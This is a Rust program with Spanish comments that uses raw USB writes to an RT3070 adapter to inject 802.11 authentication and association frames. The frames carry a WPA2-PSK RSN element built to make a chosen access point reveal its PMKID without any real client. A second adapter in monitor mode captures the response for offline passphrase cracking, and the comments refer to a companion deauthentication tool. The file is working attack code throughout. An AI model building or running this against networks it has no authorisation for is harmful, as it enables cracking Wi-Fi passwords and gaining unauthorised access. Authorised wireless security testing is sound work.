// E0-25: provocar un PMKID sin cliente real. Envia por USB crudo (RT3070)
// Authentication Request (open) + Association Request con RSN IE (WPA2-PSK,
// PMKID count=1 en cero). El AP deberia responder con una Association Response
// cuyo RSN IE incluye el PMKID; el RT73 en monitor captura esa respuesta.
// Mismo formato de TX que deauth.rs: TXINFO + TXWI + 802.11 al bulk EP 0x01.
mod common;
use common::*;
use std::process::exit;

fn parse_mac(s: &str) -> [u8; 6] {
    let p: Vec<u8> = s.split([':', '-']).filter_map(|x| u8::from_str_radix(x, 16).ok()).collect();
    if p.len() != 6 { eprintln!("MAC invalida: {s}"); exit(2); }
    [p[0], p[1], p[2], p[3], p[4], p[5]]
}

fn mgmt(fc: u16, da: &[u8; 6], sa: &[u8; 6], bssid: &[u8; 6], body: &[u8]) -> Vec<u8> {
    let mut f = Vec::new();
    f.extend_from_slice(&fc.to_le_bytes());
    f.extend_from_slice(&[0, 0]);          // duration
    f.extend_from_slice(da);
    f.extend_from_slice(sa);
    f.extend_from_slice(bssid);
    f.extend_from_slice(&[0, 0]);          // sequence control
    f.extend_from_slice(body);
    f
}

fn rsn_ie_wpa2_psk() -> Vec<u8> {
    let mut r = Vec::new();
    r.extend_from_slice(&1u16.to_le_bytes());            // version
    r.extend_from_slice(&[0x00, 0x0f, 0xac, 0x04]);      // group cipher AES
    r.extend_from_slice(&1u16.to_le_bytes());            // pairwise count
    r.extend_from_slice(&[0x00, 0x0f, 0xac, 0x04]);      // pairwise AES
    r.extend_from_slice(&1u16.to_le_bytes());            // AKM count
    r.extend_from_slice(&[0x00, 0x0f, 0xac, 0x02]);      // AKM PSK
    r.extend_from_slice(&0u16.to_le_bytes());            // RSN capabilities
    r.extend_from_slice(&1u16.to_le_bytes());            // PMKID count
    r.extend_from_slice(&[0u8; 16]);                     // PMKID vacio
    let mut ie = vec![48, r.len() as u8];
    ie.extend_from_slice(&r);
    ie
}

fn send(h: &rusb::DeviceHandle<rusb::Context>, frame: &[u8]) -> bool {
    // Tramas UNICAST de gestión: pedir ACK en TXWI (el deauth es broadcast y no lo pide).
    let txwi = txwi_bytes(frame.len() as u16, true, 1);
    let total = (4 + 20 + frame.len()) as u16;
    let info: u32 = (total as u32 & 0xffff) | (1 << 24) | (2 << 25);
    let mut pkt = Vec::new();
    pkt.extend_from_slice(&info.to_le_bytes());
    pkt.extend_from_slice(&txwi);
    pkt.extend_from_slice(frame);
    while pkt.len() % 4 != 0 { pkt.push(0); }
    let ok = match h.write_bulk(0x01, &pkt, std::time::Duration::from_millis(1000)) {
        Ok(_) => true,
        Err(e) => { println!("  bulk EP0x01 ERR: {e:?}"); false }
    };
    for l in drain_tx_status(h, 4) { println!("  [status] {l}"); }
    ok
}

fn main() {
    let a: Vec<String> = std::env::args().collect();
    let ssid = a.get(1).cloned().unwrap_or_default();
    let bssid = parse_mac(a.get(2).map(|s| s.as_str()).unwrap_or("00:00:00:00:00:00"));
    let chan: u8 = a.get(3).and_then(|s| s.parse().ok()).unwrap_or(11);
    let sta = parse_mac(a.get(4).map(|s| s.as_str()).unwrap_or("DE:AD:BE:EF:13:37"));
    if ssid.is_empty() { eprintln!("Uso: rt3070_assoc <SSID> <BSSID> <canal> [MAC propia]"); exit(2); }

    let h = match open_rt3070() { Ok(h) => h, Err(e) => { eprintln!("open: {e:?}"); exit(1); } };
    let dw0 = u32::from_le_bytes(sta[0..4].try_into().unwrap());
    let dw1 = (sta[4] as u32) | ((sta[5] as u32) << 8);
    let _ = reg_write(&h, MAC_ADDR_DW0, dw0);
    let _ = reg_write(&h, MAC_ADDR_DW1, dw1);
    let _ = reg_write(&h, MAC_BSSID_DW0, dw0);
    let _ = reg_write(&h, MAC_BSSID_DW1, dw1);
    if let Err(e) = config_channel_rt3070(&h, chan) { eprintln!("canal: {e:?}"); }
    let _ = enable_tx_pa(&h);
    let _ = reg_write(&h, USB_DMA_CFG, USB_DMA_CFG_VALUE);
    std::thread::sleep(std::time::Duration::from_millis(20));

    // Authentication Request: algorithm=Open(0), transaction=1, status=0
    let auth = mgmt(0x00b0, &bssid, &sta, &bssid, &[0, 0, 1, 0, 0, 0]);
    println!("Auth Request {} bytes", auth.len());
    let _ = send(&h, &auth);
    std::thread::sleep(std::time::Duration::from_millis(200));

    // Association Request: capability ESS, listen 0, SSID IE + RSN IE
    // capability: ESS(0x0001)+Privacy(0x0400); listen interval 10
    let mut body = vec![0x01, 0x04, 0x0a, 0x00];
    body.push(0); body.push(ssid.len() as u8); body.extend_from_slice(ssid.as_bytes());
    body.extend_from_slice(&rsn_ie_wpa2_psk());
    let assoc = mgmt(0x0000, &bssid, &sta, &bssid, &body);
    println!("Assoc Request {} bytes (SSID={ssid})", assoc.len());
    let ok = send(&h, &assoc);
    println!("{}", if ok { "Assoc Request enviada (TXDONE arriba)" } else { "Fallo al enviar Assoc Request" });
}
